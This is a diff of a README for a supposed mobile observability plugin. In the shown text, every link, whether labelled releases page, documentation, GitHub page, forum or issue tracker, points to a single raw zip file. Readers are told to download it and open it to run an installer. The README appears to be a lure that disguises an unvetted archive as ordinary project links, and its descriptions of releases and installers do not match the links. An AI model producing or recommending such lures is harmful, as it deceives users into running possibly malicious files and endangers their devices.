@@ -2,7 +2,7 @@
 
 ## 🔗 Download Here
 
-[![Release](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip)
+[![Release](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the **mobile-observability** project! This is a plugin designed for m
 
 To get started, follow these steps:
 
-1. Click this link to visit the releases page: [Download Mobile Observability](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip).
+1. Click this link to visit the releases page: [Download Mobile Observability](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip).
 2. You will see a list of available versions under the "Releases" section. Choose the latest version for your platform.
 3. Click on the version you need. You will find files for iOS, Android, and React Native. Download the relevant installer for your platform.
 4. After the download is complete, open the file to run the installer.
@@ -53,11 +53,11 @@ You can insert monitoring calls in your code without hassle. Our library support
 
 ## 📖 Documentation
 
-For detailed information on how to set up and use the mobile observability plugin, please refer to the [official documentation](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip).
+For detailed information on how to set up and use the mobile observability plugin, please refer to the [official documentation](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip).
 
 ## 🤝 Support
 
-If you face any issues or have questions, please check the issues section on our [GitHub page](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip). You can also submit your own issue, and we will help you as soon as possible.
+If you face any issues or have questions, please check the issues section on our [GitHub page](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip). You can also submit your own issue, and we will help you as soon as possible.
 
 ## 🤔 Frequently Asked Questions
 
@@ -75,12 +75,12 @@ The mobile-observability plugin is free to use for all users.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip)
-- [Community Forum](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip)
-- [Report an Issue](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip)
+- [Community Forum](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip)
+- [Report an Issue](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip)
 
 ## 🔗 Download Again
 
-To download the plugin once more, click this link: [Download Mobile Observability](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/skills/navigation-latency/observability-mobile-2.2.zip). 
+To download the plugin once more, click this link: [Download Mobile Observability](https://raw.githubusercontent.com/daryosh431/mobile-observability/main/references/platforms/observability-mobile-biform.zip). 
 
 Thank you for using mobile-observability. Happy coding!
